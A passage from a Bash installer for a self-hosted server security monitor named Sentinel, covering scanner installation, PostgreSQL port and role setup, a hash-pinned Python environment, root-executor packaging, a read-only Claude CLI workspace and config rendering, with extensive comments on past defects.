            fail "the ${name} archive unpacked but holds no file named '${name}'; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        # -D so a host without /usr/local/bin gets it rather than a failure that
        # would read like a broken archive.
        if ! install -D -m 0755 "$src" "${TOOLS_BIN_DIR}/${name}"; then
            rm -rf "$work"
            fail "could not write ${TOOLS_BIN_DIR}/${name}; NOT installed"
            n_bad=$((n_bad + 1)); continue
        fi
        rm -rf "$work"

        # Everything from here down is the effect, not the intention.
        if [[ ! -x "${TOOLS_BIN_DIR}/${name}" ]]; then
            fail "${TOOLS_BIN_DIR}/${name} is not executable after install; ${name} is NOT usable"
            n_bad=$((n_bad + 1)); continue
        fi
        if ver="$(tool_version_line "${TOOLS_BIN_DIR}/${name}")"; then
            ok "${name} installed: ${ver} (${TOOLS_BIN_DIR}/${name})"
            n_ok=$((n_ok + 1))
        else
            # Left on disk deliberately. Deleting on an ambiguous probe would be
            # destructive on doubt, and a re-run reports the same thing again
            # through tool_report_existing rather than pretending it is fine.
            warn "${name} was written to ${TOOLS_BIN_DIR}/${name} but does not run here \
— no answer to a version query. Wrong architecture, or a missing shared library. \
Treat it as NOT installed; vulnerability scanning will not use it."
            n_bad=$((n_bad + 1))
        fi
    done < "$manifest"

    # Green only when every tool in the manifest was proved to be on the host at
    # the pinned version. An unproven one counts against the verdict too: this
    # line is the last thing about step 21 the operator reads, and a green one
    # over a scanner nobody could identify is the whole failure mode again.
    #
    # And "every tool" is vacuously true over no tools at all. A manifest that
    # holds only comments, or zero bytes, walks the loop zero times, leaves all
    # four counters at 0, and used to close with
    # `[+] external tools: 0 installed, 0 already present` — after which
    # run_step wrote the 21_external_tools marker, so every later run printed
    # "already done" and the operator never saw the step again. That is the
    # defect the manifest's own header records for 10 August 2026, one door
    # further along: the MISSING file was handled, the empty one was not.
    # Proving nothing is not proving everything.
    local n_seen=$((n_ok + n_present + n_unproven + n_bad))
    if (( n_seen == 0 )); then
        warn "the tools manifest at ${manifest} pins no tools, so step 21 \
installed nothing. Vulnerability scanning (P7) has no scanners until Trivy and \
nuclei are listed there — the file is present but holds no entry."
    # `n_ok + n_present == 0` cannot be true here as the counters stand today.
    # n_seen is those two plus n_unproven and n_bad, so once n_seen is non-zero
    # and neither of the other two is, the first two cannot both be zero. The
    # clause is unfalsifiable: no test can make it decide anything, and none
    # does. That is a real objection and it is not being waved away.
    #
    # It stays, and this comment is the whole of why. The scenario it is
    # written for is a FIFTH counter added to n_seen but not to the warn below
    # — a tool the loop skipped, say. In that world the `n_seen == 0` branch
    # stops firing for a manifest that proved nothing, and this clause is the
    # only thing left between that manifest and a green line. It fires with the
    # wrong words when it does: all four numbers read 0 and "see the lines
    # above" points at nothing. But a warn with an incomplete message is a
    # thing the operator goes and looks at, while
    # `ok: 0 installed, 0 already present` over a step that proved nothing is
    # the exact lie step 21 was rewritten to stop telling — the same shape as
    # loading audit rules with the kernel's complaint sent to /dev/null.
    #
    # So, to whoever adds the fifth counter: add it to the warn below too, not
    # only to n_seen. Carrying that sentence to you is what this clause is for.
    elif (( n_bad > 0 || n_unproven > 0 || n_ok + n_present == 0 )); then
        warn "external tools: ${n_ok} installed, ${n_present} already present at the \
pinned version, ${n_unproven} present but unverified, ${n_bad} NOT installed. \
Vulnerability coverage is not proven for those — see the lines above."
    else
        ok "external tools: ${n_ok} installed, ${n_present} already present"
    fi
}

# The result of a repair, in a global rather than on stdout — deliberately, and
# for the reason `docker_server_version_as` already documents a few hundred
# lines up: this function shells out to `systemctl`, whose own chatter (e.g.
# "Created symlink …" from `enable`) would land inside a captured value the
# same way DOCKER_PROBE_ERR was corrupted the first time that mistake was
# made here. A plain global sidesteps the whole class of bug instead of
# suppressing every external command's stdout by hand and hoping none of them
# ever adds a line.
PG_RESOLVED_PORT=""

# Default poll timeout for pg_ensure_listening, in seconds — a variable
# rather than a literal in the same shape as TOOL_PROBE_TIMEOUT_S above, so a
# test can shrink it (source the file, set this, call the function) without
# threading a 4th argument through step_postgres. Production never sets it.
PG_LISTEN_TIMEOUT_S=15

# Restoring postgresql.conf to the port it held before this run touched it is
# not restoring the database — a live cluster does not re-read its config
# file on its own, and CLAUDE.md's own `systemctl reload nginx` row is exactly
# this: the signal reported success while the thing it was meant to change
# never took effect. This is what puts the cluster BACK: rewrite the config
# (a no-op if it already matches), restart, and wait for a REAL bind on
# $2 — the same `pg_wait_listening` every other path here is judged by, never
# the restart's own exit code.
#
# Returns 0 only once $2 is confirmed listening again. Returns 1, and prints
# nothing itself, when it is not — the caller decides how loud to be about
# that, because "the previous port came back" and "PostgreSQL is now down and
# nothing brought it back" are different die() messages, not the same one
# with a config line quietly wrong underneath it.
#
# The restart itself is skipped, not the config write, when restore_port is
# already confirmed listening: when the port this run was actually asked
# for was held by a stranger, pg_ensure_listening's own primary path never
# restarts the cluster (a stranger holding the port stays held through a
# restart, see the comment above pg_ensure_listening) — so by the time a
# die() path calls this, the cluster can already be sitting exactly on
# restore_port, untouched. Restarting it anyway would be the same
# production-database downtime CLAUDE.md warns about, spent confirming a
# fact that was already true. The config line still gets fixed either way —
# see below — because that mismatch is possible independently of whether
# the cluster itself ever moved.
pg_restore_to() {
    local pgconf="$1" restore_port="$2" timeout="$3"
    # The config write happens regardless of what is already listening: a
    # cluster that never left restore_port does not excuse postgresql.conf
    # still naming the port this run tried and failed on — that mismatch is
    # exactly the time-bomb the comment above pg_ensure_listening warns
    # about, waiting for the next unrelated restart to act on it.
    [[ "$restore_port" == "$(pg_configured_port "$pgconf")" ]] || \
        pg_set_port "$pgconf" "$restore_port"
    # Only the restart is conditional: skip it when the cluster is already
    # confirmed listening on restore_port, so a stranger holding the
    # explicitly requested port (which pg_ensure_listening's primary path
    # never restarts for) does not cost a second restart here for nothing.
    pg_wait_listening "$restore_port" 1 && return 0
    systemctl restart postgresql >/dev/null 2>&1 || true
    pg_wait_listening "$restore_port" "$timeout"
}

# Makes PostgreSQL actually listen on $2 (config dir $1), or dies with a
# diagnostic that names what to run next — never returns having merely tried
# and hoped. $3 non-empty means $2 came from --db-port: an explicit request is
# refused outright rather than silently moved to a different port. $4 is the
# poll timeout in seconds (default $PG_LISTEN_TIMEOUT_S) — only so a test can
# shrink it; production never passes it. $5, if given, is the port
# postgresql.conf held before THIS call touched anything — used only to put
# it back before a die(), see below.
#
# `enable --now` / `restart` reporting 0 is not proof the server is up on this
# port (CLAUDE.md's `systemctl enable --now` row is exactly this bug), so
# every path below is decided by `pg_wait_listening`, which polls `ss` and
# checks OWNERSHIP by cgroup — not merely "is the port no longer free". A host
# has been measured where something published from a Docker container already
# held 5432 before PostgreSQL ever tried to bind it, with no postgresql
# package installed at all; "the port is taken" there means "not PostgreSQL",
# and treating it as "reuse what's on 5432" would point Sentinel at a
# stranger's database with the wrong credentials.
#
# `enable --now` is a no-op on an ALREADY-ACTIVE unit — CLAUDE.md names this
# exact bug. On Debian/Ubuntu the package postinst starts the cluster during
# step 20 (pg_bootstrap), so step 22 meets a cluster that is already running
# on whatever port it started on; `enable --now` alone never notices
# postgresql.conf changed under it, no matter how many times it is called.
# The escalation below is conditioned on the TARGET port being free — nobody,
# us or a stranger, bound to it — because that is the one situation a restart
# can fix. A port a stranger already holds stays held through a restart; that
# case is handled further down by moving off it instead.
pg_ensure_listening() {
    local pgconf="$1" port="$2" explicit="${3:-}" timeout="${4:-$PG_LISTEN_TIMEOUT_S}" \
          restore_port="${5:-}"
    PG_RESOLVED_PORT=""

    systemctl enable --now postgresql >/dev/null 2>&1 || true
    if pg_wait_listening "$port" "$timeout"; then
        PG_RESOLVED_PORT="$port"
        return 0
    fi

    if port_free "$port"; then
        systemctl restart postgresql >/dev/null 2>&1 || true
        if pg_wait_listening "$port" "$timeout"; then
            PG_RESOLVED_PORT="$port"
            return 0
        fi
    fi

    if [[ -n "$explicit" ]]; then
        # A die() here must not leave postgresql.conf naming a port the
        # cluster is not actually on — the live cluster would move there on
        # its own at the next unrelated restart or reboot while
        # sentinel.yaml still names the old one. But rewriting the file is
        # not enough either (see pg_restore_to): a typo'd --db-port on a host
        # where the cluster was already up and running must not leave it
        # DOWN just because the config line looks right again.
        local tail="Inspect:  journalctl -u postgresql -n 50 --no-pager"
        if [[ -n "$restore_port" ]]; then
            if pg_restore_to "$pgconf" "$restore_port" "$timeout"; then
                tail="postgresql.conf and the running cluster are both back on the \
previous port ${restore_port}. ${tail}"
            else
                tail="restoring postgresql.conf to the previous port ${restore_port} did \
NOT bring the cluster back up — PostgreSQL is DOWN. Inspect immediately:  \
journalctl -u postgresql -n 50 --no-pager"
            fi
        fi
        die "PostgreSQL did not come up listening on --db-port ${port}. ${tail}"
    fi
    if port_free "$port"; then
        die "PostgreSQL service did not start, and port ${port} is free — \
this is not a port conflict. Inspect:  journalctl -u postgresql -n 50 --no-pager"
    fi

    local occupant; occupant="$(port_owner "$port")"
    warn "port ${port} is held by ${occupant:-something else}, not this \
PostgreSQL cluster. Moving Sentinel's cluster to a free port instead of \
connecting to whatever that is."
    local new_port; new_port="$(pg_pick_free_port "$port")" || \
        die "no free port found near ${port} for PostgreSQL"
    pg_set_port "$pgconf" "$new_port"
    systemctl restart postgresql >/dev/null 2>&1 || true
    if pg_wait_listening "$new_port" "$timeout"; then
        PG_RESOLVED_PORT="$new_port"
        return 0
    fi
    local tail="Inspect:  journalctl -u postgresql -n 50 --no-pager"
    if [[ -n "$restore_port" ]]; then
        if pg_restore_to "$pgconf" "$restore_port" "$timeout"; then
            tail="postgresql.conf and the running cluster are both back on the \
previous port ${restore_port}. ${tail}"
        else
            tail="restoring postgresql.conf to the previous port ${restore_port} did NOT \
bring the cluster back up — PostgreSQL is DOWN. Inspect immediately:  \
journalctl -u postgresql -n 50 --no-pager"
        fi
    fi
    die "PostgreSQL still not listening on ${new_port} after moving off \
the conflicting port ${occupant:-unknown}. ${tail}"
}

# --- 22 -------------------------------------------------------------------
# The port this cluster ends up on is measured after the fact, never assumed.
# `sentinel.yaml`'s database.port (step 26) reads it back with
# `pg_configured_port`, from the exact file this step writes — see there for
# what happens on a host that reaches step 26 without this step ever having run.
step_postgres() {
    # RHEL keeps configuration inside the data directory; Debian splits it
    # into /etc/postgresql/<version>/main and initialises the cluster in its
    # postinst, so there is nothing to initdb there.
    local pgconf; pgconf="$(pg_confdir)"
    [[ -d "$pgconf" ]] || die "PostgreSQL config directory not found at ${pgconf}"

    install -D -m 0644 -o postgres -g postgres \
        "${SCRIPT_DIR}/postgres/sentinel-tuning.conf" \
        "${pgconf}/conf.d/sentinel-tuning.conf"
    # The guard has to match what gets WRITTEN below, or it never matches and
    # every --force-step 22 appends another copy — measured on the production
    # host as four identical `include_dir = 'conf.d'` lines. `grep -q
    # "include_dir 'conf.d'"` (no `=`) never matched the `include_dir =
    # 'conf.d'` this line appends; this pattern does, so a rerun converges.
    # Deliberately NOT touching the duplicates already on disk here: this is a
    # one-line idempotency guard, not a migration, and editing postgresql.conf
    # on a live cluster wants its own reviewed change, not a side effect of it.
    grep -qE "^[[:space:]]*include_dir[[:space:]]*=[[:space:]]*'conf\.d'" \
        "${pgconf}/postgresql.conf" || \
        echo "include_dir = 'conf.d'" >> "${pgconf}/postgresql.conf"

    # Loopback only, scram-sha-256. The database is never reachable off-host.
    #
    # These rules are INSERTED before the distribution defaults, not appended.
    # pg_hba is first-match-wins, and AlmaLinux ships a broad
    # `host all all 127.0.0.1/32 ident` line. Appended after it, our scram rules
    # would never be reached and every connection as `sentinel` would fail with
    # "Ident authentication failed" — which is exactly what happened. The guard
    # matches our actual rule so a re-run is idempotent regardless of position.
    local hba="${pgconf}/pg_hba.conf"
    if ! grep -qE '^[[:space:]]*host[[:space:]]+sentinel[[:space:]]+sentinel[[:space:]]+127' "$hba"; then
        local hba_tmp; hba_tmp="$(mktemp)"
        awk -v snip="${SCRIPT_DIR}/postgres/pg_hba.snippet" '
            !ins && /^[[:space:]]*(local|host|hostssl|hostnossl)[[:space:]]/ {
                while ((getline line < snip) > 0) print line
                close(snip); ins = 1
            }
            { print }
            END { if (!ins) { while ((getline line < snip) > 0) print line } }
        ' "$hba" > "$hba_tmp"
        install -m 0600 -o postgres -g postgres "$hba_tmp" "$hba"
        rm -f "$hba_tmp"
        ok "pg_hba.conf updated (sentinel scram rules before the defaults)"
    fi

    # --- port -------------------------------------------------------------
    # NEVER assumed to be 5432. Debian's own postgresql-common already ran a
    # real bind test at package-install time (step 20, inside `pg_bootstrap`)
    # and may have moved this cluster off 5432 on its own; RHEL's default is
    # whatever `postgresql-setup --initdb` left, which stays 5432 unless
    # something has changed it. Either way the LIVE configuration file is the
    # source of truth, not this installer's memory of what port it expected.
    local pg_port; pg_port="$(pg_configured_port "$pgconf")"
    local pg_port_explicit="" pg_port_before="$pg_port"

    if [[ -n "$DB_PORT_OVERRIDE" && "$DB_PORT_OVERRIDE" != "$pg_port" ]]; then
        pg_set_port "$pgconf" "$DB_PORT_OVERRIDE"
        pg_port="$DB_PORT_OVERRIDE"
        info "postgresql.conf: port set to ${pg_port} (--db-port)"
    fi
    [[ -n "$DB_PORT_OVERRIDE" ]] && pg_port_explicit=1

    # $pg_port_before travels through as pg_ensure_listening's restore_port:
    # what was on disk before this run touched anything, so a die() there
    # undoes the rewrite instead of leaving postgresql.conf naming a port the
    # cluster never actually reached.
    pg_ensure_listening "$pgconf" "$pg_port" "$pg_port_explicit" "" "$pg_port_before"
    pg_port="$PG_RESOLVED_PORT"
    ok "PostgreSQL listening on 127.0.0.1:${pg_port} (verified with ss, owned by postgresql)"

    local db_password="${SECRETS[SENTINEL_DB_PASSWORD]:-}"
    [[ -z "$db_password" ]] && die "SENTINEL_DB_PASSWORD was not supplied on stdin"

    # The statement is fed on stdin, NOT via -c: psql only interpolates :'pw' for
    # input read from stdin or a file; with -c it treats the string as
    # server-parsable SQL and passes :'pw' through literally, which the server
    # then rejects with "syntax error at or near :". The password itself is fed
    # the SAME way — a `\set pw '...'` line on that same stdin, NOT `-v
    # pw="$db_password"`, which puts it on psql's argv where `ps` and every
    # execve audit rule can read it. That was the actual bug here: the comment
    # already claimed the property this line now has, while `-v` quietly
    # undid it — measured on the production host as 7 execve audit rules
    # loaded, so every deploy wrote the password to audit.log.
    # pg_psql_set_escape (deploy/lib/common.sh) does the quoting `\set`'s own
    # argument grammar needs; see it for why the escaping order matters and
    # how it was checked against a real server, not assumed.
    local db_password_set; db_password_set="$(pg_psql_set_escape "$db_password")"
    if ! sudo -u postgres psql -p "$pg_port" -tAc "SELECT 1 FROM pg_roles WHERE rolname='sentinel'" | grep -q 1; then
        printf "%s\n" "\\set pw '${db_password_set}'" "CREATE ROLE sentinel LOGIN PASSWORD :'pw';" \
            | sudo -u postgres psql -p "$pg_port" -v ON_ERROR_STOP=1 >/dev/null
        ok "role sentinel created"
    else
        printf "%s\n" "\\set pw '${db_password_set}'" "ALTER ROLE sentinel PASSWORD :'pw';" \
            | sudo -u postgres psql -p "$pg_port" -v ON_ERROR_STOP=1 >/dev/null
        ok "role sentinel password updated"
    fi

    if ! sudo -u postgres psql -p "$pg_port" -tAc "SELECT 1 FROM pg_database WHERE datname='sentinel'" | grep -q 1; then
        sudo -u postgres createdb -p "$pg_port" -O sentinel sentinel
        ok "database sentinel created"
    fi
    systemctl reload postgresql

    # A role created and a service "reloaded" are not proof a client can reach
    # it — the DSN Sentinel will actually use is host+port+role+password
    # together, and this is the one point in the install that can prove all
    # four at once before sentinel.yaml is written.
    #
    # stderr is CAPTURED, not discarded: "no pg_hba.conf entry", "password
    # authentication failed" and "connection refused" are three different
    # fixes, and journalctl carries none of them — that's the SERVER log, and
    # this is a CLIENT-side rejection psql reports on its own stderr, before
    # the server would ever write anything. The password itself never appears
    # in this text (psql never echoes PGPASSWORD), only PostgreSQL's own
    # error strings, so nothing secret reaches the die message.
    local conn_err conn_out
    conn_err="$(mktemp)"
    # `|| true`: under `set -e`, a failed command inside a bare assignment
    # (not inside an `if`) aborts the WHOLE script right here with no message
    # at all — silently skipping the die() below on exactly the connection
    # failure this block exists to diagnose. The `if` two lines down is what
    # actually decides success; this command must be allowed to fail into it.
    conn_out="$(PGPASSWORD="$db_password" psql -h 127.0.0.1 -p "$pg_port" -U sentinel -d sentinel \
            -tAc "SELECT 1" 2>"$conn_err")" || true
    if ! printf '%s\n' "$conn_out" | grep -q 1; then
        local conn_reason; conn_reason="$(cat "$conn_err")"
        rm -f "$conn_err"
        die "role and database exist, but a client connection to \
127.0.0.1:${pg_port}/sentinel as sentinel failed: ${conn_reason}
Inspect pg_hba.conf."
    fi
    rm -f "$conn_err"
    ok "psql connects to 127.0.0.1:${pg_port}/sentinel as sentinel (verified)"
}

# --- 23 -------------------------------------------------------------------
step_venv() {
    local py="${PYTHON_BIN:-$(python_find || echo python3)}"
    have "$py" || py=python3

    if [[ ! -x "${SENTINEL_PREFIX}/venv/bin/python" ]]; then
        "$py" -m venv "${SENTINEL_PREFIX}/venv"
        ok "virtualenv created"
    fi
    "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet --upgrade pip wheel

    # Hash-pinned where available: a compromised mirror cannot substitute a
    # package under Sentinel's own privileges.
    if [[ -f "${SRC_ROOT}/requirements-lock.txt" ]]; then
        "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet \
            --require-hashes -r "${SRC_ROOT}/requirements-lock.txt" \
            || die "pip install (hash-pinned) failed"
        ok "dependencies installed from the hash-pinned lockfile"
    else
        warn "requirements-lock.txt is absent; installing from requirements.txt \
without hash verification. Generate the lock with pip-compile --generate-hashes."
        "${SENTINEL_PREFIX}/venv/bin/pip" install --quiet -r "${SRC_ROOT}/requirements.txt" \
            || die "pip install failed"
    fi
}

# --- 24 -------------------------------------------------------------------
step_package() {
    rm -rf "${SENTINEL_PREFIX}/lib/sentinel" "${SENTINEL_PREFIX}/lib/executor"
    install -d -m 0755 "${SENTINEL_PREFIX}/lib"
    cp -r "${SRC_ROOT}/sentinel" "${SENTINEL_PREFIX}/lib/sentinel"
    cp "${SRC_ROOT}/VERSION" "${SENTINEL_PREFIX}/VERSION"
    chown -R root:root "${SENTINEL_PREFIX}/lib"
    find "${SENTINEL_PREFIX}/lib" -type d -exec chmod 0755 {} +
    find "${SENTINEL_PREFIX}/lib" -type f -exec chmod 0644 {} +

    # The executor is the only root component. Root-owned, not writable by the
    # sentinel user, and importing nothing from the main package — so a
    # compromise of sentinel/ cannot reach into it.
    install -D -m 0755 -o root -g root \
        "${SRC_ROOT}/executor/sentinel_executor.py" "${SENTINEL_PREFIX}/libexec/sentinel_executor.py"
    for f in commands.py policy.py transient_unit.py; do
        [[ -f "${SRC_ROOT}/executor/${f}" ]] && \
            install -D -m 0644 -o root -g root \
                "${SRC_ROOT}/executor/${f}" "${SENTINEL_PREFIX}/libexec/${f}"
    done

    # The SAME policy.py, installed a second time on the sentinel package's own
    # import path (PYTHONPATH=/opt/sentinel/lib in every unit).
    # `sentinel/patch/validator.py` imports it and asks IT whether a plan's
    # commands would be permitted, instead of keeping a second opinion about
    # the grammar — the two had already drifted far enough that the validator
    # approved `apt-get -y install --only-upgrade <pkg>`, which the executor
    # refuses at apply step 1.
    #
    # Same file, same step, so the copy cannot lag behind the one the root
    # process runs. Root-owned and 0644: the unprivileged side can READ the
    # rules and still cannot change them, and it never executes this copy —
    # /opt/sentinel/libexec/policy.py is what the root daemon loads.
    #
    # No __init__.py: `executor` is an implicit namespace package, which is
    # also how it is imported from the repository root in the test suite.
    install -d -m 0755 -o root -g root "${SENTINEL_PREFIX}/lib/executor"
    install -m 0644 -o root -g root \
        "${SRC_ROOT}/executor/policy.py" "${SENTINEL_PREFIX}/lib/executor/policy.py"

    # Not "the file is on disk" — that is what the step already did. This
    # imports it the way the validator will, as the unprivileged user, from a
    # directory that is not the source tree, and checks that the object it got
    # back is the grammar and not an empty namespace package. A file present
    # but unimportable (wrong path, wrong permissions, a stray __init__.py
    # shadowing it) would otherwise show up for the first time as "every patch
    # plan is refused", hours later, on Telegram.
    local import_err
    if ! import_err="$(sudo -u "$SENTINEL_USER" env PYTHONPATH="${SENTINEL_PREFIX}/lib" \
            "${SENTINEL_PREFIX}/venv/bin/python" -c \
            'import executor.policy as p; p.check_argv(["dnf","-y","update","nginx"])' 2>&1)"; then
        die "executor.policy is not importable from ${SENTINEL_PREFIX}/lib as ${SENTINEL_USER} — \
sentinel/patch/validator.py asks it whether a plan's commands may run, so every patch plan would be \
refused with 'executor_policy_unreadable' until this is fixed: ${import_err//$'\n'/ }"
    fi

    # Front-end libraries: downloaded with checksum verification, never
    # committed. P1 needs none of them; from P2 the charts do.
    if [[ -x "${SRC_ROOT}/scripts/vendor-assets.sh" ]]; then
        sudo -u "$SENTINEL_USER" "${SRC_ROOT}/scripts/vendor-assets.sh"             2>/dev/null || info "vendored assets not fetched; charts arrive in P2"
    fi

    cat > "${SENTINEL_PREFIX}/bin/sentinel" <<EOF
#!/bin/sh
exec env PYTHONPATH="${SENTINEL_PREFIX}/lib" \\
    "${SENTINEL_PREFIX}/venv/bin/python" -m sentinel "\$@"
EOF
    chmod 0755 "${SENTINEL_PREFIX}/bin/sentinel"
    ln -sf "${SENTINEL_PREFIX}/bin/sentinel" /usr/local/bin/sentinel
    ok "package installed to ${SENTINEL_PREFIX}/lib"
}

# --- 25 -------------------------------------------------------------------
step_claude_workspace() {
    local ws="${SENTINEL_PREFIX}/claude-workspace"
    install -d -m 0755 -o "$SENTINEL_USER" -g "$SENTINEL_USER" "${ws}/.claude"

    # The headless CLI runs with cwd AND HOME set to this directory, so the
    # skill is discovered both as a project skill and as a personal one.
    rm -rf "${ws}/.claude/skills" "${ws}/.claude/agents"
    cp -r "${SRC_ROOT}/.claude/skills" "${ws}/.claude/skills"
    cp -r "${SRC_ROOT}/.claude/agents" "${ws}/.claude/agents"

    # Runtime settings, NOT the developer-machine ones: read-only, plan mode,
    # no network, no writes.
    install -m 0644 "${SCRIPT_DIR}/claude-workspace/settings.json" "${ws}/.claude/settings.json"
    install -m 0644 "${SCRIPT_DIR}/claude-workspace/CLAUDE.md"     "${ws}/CLAUDE.md"

    chown -R "$SENTINEL_USER:$SENTINEL_USER" "$ws"
    find "${ws}/.claude/skills" -name '*.py' -exec chmod 0755 {} +

    ok "Claude workspace installed at ${ws}"
    if ! have claude; then
        info "the claude CLI is not installed. Patch-plan generation and /ask need it; \
API-based triage, correlation and reports do not. Install it later if you want those."
    fi
}

# --- 26 -------------------------------------------------------------------
# Will there be an auditd feeding the collector on this host?
#
# `ingest.auditd: true` used to be hardcoded in the template. On Ubuntu 24.04.4
# auditd is not installed at all — `auditctl` did not exist — so the shipped
# configuration told the collector to read a file that would never be created.
# Nothing failed; the host.* detections and auth.new_user / auth.new_ssh_key
# simply never fired, on a dashboard that reported itself healthy. A
# configuration that lies is worse than a missing package: the missing package
# is at least visible.
#
# Two facts, both about this host and neither about our intent: the control
# binary exists, and the log the template names is actually there. The DAEMON
# being up right now is deliberately NOT one of them — step 26 re-runs on every
# deploy, and an auditd restarted at the wrong second would otherwise flip the
# configuration to false and leave it there. A stopped auditd still has its log
# file, and is warned about separately below.
#
# An auditd configured to write somewhere other than AUDITD_LOG_PATH also
# answers no, and that is correct rather than pedantic: the collector opens that
# exact path, so a log kept elsewhere is a log it cannot read.
auditd_feeds_the_collector() {
    have auditctl || return 1
    [[ -f "$AUDITD_LOG_PATH" ]]
}

step_configs() {
    # `scan.containers` is measured, never guessed. `ensure_docker_access` runs
    # unconditionally before this step and leaves the answer in SCAN_CONTAINERS;
    # an empty value means something reordered main, and the quiet alternative
    # would be a configuration claiming a capability nobody checked for.
    if [[ -z "${SCAN_CONTAINERS:-}" ]]; then
        die "internal: ensure_docker_access did not run before step 26, so \
scan.containers would be written on a guess"
    fi

    # database.port is measured, never guessed at 5432. Read from the live
    # cluster config step 22 wrote — not from a variable, so a resume that
    # skips step 22 (already marked done in an earlier pass) still gets the
    # port THAT pass actually resolved, and a host that reaches step 26 with
    # no cluster configured at all is refused rather than handed a default
    # that happens to be wrong exactly on the host this exists for.
    local pgconf; pgconf="$(pg_confdir)"
    if [[ ! -f "${pgconf}/postgresql.conf" ]]; then
        die "internal: no PostgreSQL configuration at ${pgconf} — step 22 \
(postgres) must run before step 26 writes sentinel.yaml, or database.port \
would be written on a guess"
    fi
    local db_port; db_port="$(pg_configured_port "$pgconf")"

    # NOT a `trap ... RETURN`: without `set -o functrace` a RETURN trap set in a
    # function is not cleared when that function returns, so it fires again on the
    # next function return — run_step's — where $tmp is out of scope and `set -u`
    # aborts with "tmp: unbound variable". Explicit cleanup at the end avoids the
    # leak; a mid-way `die` exits the whole installer anyway, and a stray mktemp
    # dir in /tmp is harmless.
    local tmp; tmp="$(mktemp -d)"

    local hostname_fqdn iface bpf extra_allow
    hostname_fqdn="$(hostname -f 2>/dev/null || hostname)"
    iface="$(ip route show default 2>/dev/null | awk '/default/ {print $5; exit}')"
    iface="${iface:-eth0}"

    # Seed the admin address into response.extra_allowlist so the ROOT EXECUTOR
    # refuses to block it, not just the nftables allowlist (which only wins the
    # accept/drop race). Empty when no admin IP was determined — a bare `[]`.
    extra_allow=""
    [[ -n "${ADMIN_IP:-}" ]] && extra_allow="\"${ADMIN_IP}\""

    # Preflight may have identified a dominant flow worth excluding. Pre-filling
    # it beats leaving the operator to discover the disk is full.
    bpf=""
    [[ -n "${BPF_HINT:-}" ]] && bpf="not host ${BPF_HINT}"

    local auditd_enabled=false
    if auditd_feeds_the_collector; then
        auditd_enabled=true
        if ! systemctl is-active --quiet auditd 2>/dev/null; then
            warn "auditd is installed but its service is not running. ingest.auditd stays \
true — ${AUDITD_LOG_PATH} is there — but nothing new is being written to it. Start it with: \
systemctl enable --now auditd"
        fi
    else
        warn "no auditd on this host (auditctl missing, or ${AUDITD_LOG_PATH} absent), so \
ingest.auditd is written as FALSE rather than pointed at a file that will not exist.
    What that costs: every host.* detection, plus auth.new_user and auth.new_ssh_key.
    The rules sentinel_identity, sentinel_ssh, sentinel_cron, sentinel_systemd,
    sentinel_webroot, sentinel_exec, sentinel_priv and sentinel_cmd have nothing to load them.
    Install auditd and re-run this step:  --force-step 26"
    fi

    # PLATFORM_FAMILY comes straight from the `distro_detect` this process ran at
    # startup — NOT from preflight.env. preflight.env is sourced by
    # resolve_config, which runs AFTER that detection, so routing the family
    # through it would let a stale file from an earlier run on another host
    # override the live answer. One detection, one value, no second opinion.
    sed -e "s|@@DOMAIN@@|${DOMAIN}|g" \
        -e "s|@@HOSTNAME@@|${hostname_fqdn}|g" \
        -e "s|@@PLATFORM_FAMILY@@|${DISTRO_FAMILY}|g" \
        -e "s|@@NGINX_MODE@@|${NGINX_MODE}|g" \
        -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
        -e "s|@@IFACE@@|${iface}|g" \
        -e "s|@@BPF_FILTER@@|${bpf}|g" \
        -e "s|@@SURICATA_ENABLED@@|$( (( SURICATA_OK )) && echo true || echo false )|g" \
        -e "s|@@AUDITD_ENABLED@@|${auditd_enabled}|g" \
        -e "s|@@SCAN_CONTAINERS@@|${SCAN_CONTAINERS}|g" \
        -e "s|@@DB_PORT@@|${db_port}|g" \
        -e "s|@@TELEGRAM_CHAT_ID@@|${SECRETS[TELEGRAM_CHAT_ID]:-0}|g" \
        -e "s|@@EXTRA_ALLOWLIST@@|${extra_allow}|g" \
        "${SCRIPT_DIR}/config/sentinel.yaml.tmpl" > "${tmp}/sentinel.yaml"

    install_config "${tmp}/sentinel.yaml" "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 0640
    install_config "${SCRIPT_DIR}/config/inventory.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/inventory.yaml" 0640
    install_config "${SCRIPT_DIR}/config/detection.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/detection.yaml" 0640
    install_config "${SCRIPT_DIR}/config/notifications.yaml.example" \
                   "${SENTINEL_CONFIG_DIR}/notifications.yaml" 0640

    # Sentinel ships NO logrotate configuration, and removes the one earlier
    # versions installed.
    #
    # It claimed /var/log/nginx/sentinel-*.log and /var/log/suricata/*, all of
    # which the nginx and suricata packages already rotate. logrotate treats a
    # path claimed twice as a fatal error and skips BOTH files entirely — so a
    # config written to guarantee rotation was the reason rotation stopped.
    # Suricata's eve.json and stats.log grew unrotated for days.
    #
    # The `create 0640 nginx adm` line looked load-bearing for the collectors.
    # It was not: step_suricata and step_auxiliary set DEFAULT ACLs on both log
    # directories, so files logrotate creates are readable by the sentinel user
    # whatever mode and owner the distribution's config asks for. The ACL is the
    # mechanism; the logrotate stanza only ever looked like it.
    if [[ -f /etc/logrotate.d/sentinel ]]; then
        rm -f /etc/logrotate.d/sentinel
        ok "removed /etc/logrotate.d/sentinel (it duplicated distribution-owned paths)"
    fi

    # Validate what is left. A duplicate claimed by any package silently stops
    # rotating the file it names, and the first symptom is a full disk.
    if have logrotate && ! logrotate --debug /etc/logrotate.conf >/dev/null 2>&1; then
        warn "logrotate reports a configuration error. Rotation may be stopped for \
some files. Inspect with:  logrotate --debug /etc/logrotate.conf"
    fi

    rm -rf "$tmp"
}

# --- 27 -------------------------------------------------------------------
# Keys generated on this host, never transferred, and — critically — never
# regenerated. Both are used to encrypt or sign things that OUTLIVE the install:
#
#   SENTINEL_SESSION_SECRET     encrypts every stored TOTP secret
#   TELEGRAM_CALLBACK_HMAC_KEY  signs outstanding approval buttons
#
# Rotating either one silently invalidates credentials the operator still holds.
# The first version of this checked for an existing value in the EMPTY temp file
# it had just created, so the check never matched and a fresh secret was written
# on every run — meaning every re-deploy locked the operator out of their own
# dashboard with "TOTP incorrect", and no message anywhere said why.
GENERATED_SECRET_KEYS=(TELEGRAM_CALLBACK_HMAC_KEY SENTINEL_SESSION_SECRET)

